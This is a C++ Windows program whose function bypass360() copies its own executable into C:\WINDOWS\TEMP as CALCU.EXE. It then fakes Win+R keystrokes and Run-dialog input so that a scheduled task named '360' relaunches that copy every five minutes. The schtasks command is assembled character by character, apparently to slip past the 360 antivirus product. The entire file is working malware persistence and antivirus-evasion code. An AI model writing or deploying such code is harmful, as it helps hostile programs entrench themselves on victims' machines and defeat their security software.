#include<windows.h>
#include<stdio.h>
HWND T=NULL,Run=NULL,hq=NULL;

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2, temp1);
	if (T != NULL && Run != NULL &&strstr(temp1, "Cmd.exe") != NULL) {
		hq = hWnd;
	}
	return true;
}
BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam)
{
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2,temp1);
	if (!strcmp(temp2, "Edit")) {
		//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2, temp1);
		HWND h = GetParent(hWnd);
		GetClassName(h, temp2, 255);
		if (!strcmp(temp2, "ComboBox")) {
			HWND h2 = GetParent((HWND)h);
			GetClassName(h2, temp2, 255);
			if (!strcmp(temp2, "#32770")) {
				T = hWnd;
				Run = h2;
			}
		}

	}
	return true;
}
void SMG(HWND id, char c) {
	//S SendMessage_ = (S)fpSendMsg;
	SendMessage(id, WM_CHAR, c, 0);
}
void bypass360() {
	char szPath[MAX_PATH];
	memset(szPath, 0, 255);
	GetModuleFileName(NULL, szPath, MAX_PATH);
	MessageBox(0, szPath, szPath, 0);
	CopyFile(szPath, "C:\\WINDOWS\\TEMP\\CALCU.EXE", true);
	//S SendMessage_ = (S)fpSendMsg;
	//P PostMessage_ = (P)fpPostMsg;
	keybd_event(VK_LWIN, 0, 0, 0);
	keybd_event('R', 0, 0, 0);
	keybd_event('R', 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
	for (int i = 0; i <= 20000; i++) {
		EnumChildWindows(GetDesktopWindow(), EnumChildProc, 0);
		if (T != NULL && Run != NULL) {
			break;
		}
	}
	if (T == NULL) {
		//printf("t is null");
		return;
	}
	keybd_event(VK_CAPITAL, 0, 0, 0);
	SendMessage(T, WM_CHAR, VK_BACK, 0);
	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, 'm', 0);
	SendMessage(T, WM_CHAR, 'd', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 13, 0);
	PostMessage(T, WM_KEYDOWN, VK_RETURN, 0);

	//HWND hq = NULL;
	for (int i = 0; i <= 20000; i++) {
		EnumWindows(EnumProc, 0);
		if (hq != NULL) {
			Sleep(100);
			break;
		}
	}
	//printf("cmd:%d\n", hq);
	char a[75] = { 'S','C','H','T','A'
		,'S','K','S',VK_SPACE,'/','C'
		,'R','E','A','T','E',VK_SPACE,'/',
		'S','C',VK_SPACE,'M','I','N',
		'U','T','E',VK_SPACE,'/','M','O',VK_SPACE,
		'5',VK_SPACE,'/','T','N',VK_SPACE,'3','6','0',
		VK_SPACE,'/','T','R',VK_SPACE,'C',':','\\','W','I','N','D','O','W','S','\\','T','E','M','P','\\',
		'C','A','L','C','U','.','E','X','E',VK_SPACE,'/','F',' '
	};
	for (int i = 0; i <= 74; i++) {
		//printf("%c", a[i]);
		SMG(hq, a[i]);
	}
	SendMessage(hq, WM_CHAR, 13, 0);
	char b[5] = { 'e','x','i','t' };
	for (int i = 0; i <= 4; i++) {
		SMG(hq, b[i]);
	}
	PostMessage(hq, WM_CHAR, 13, 0);

}

int main() {

	bypass360();
	system("pause");
}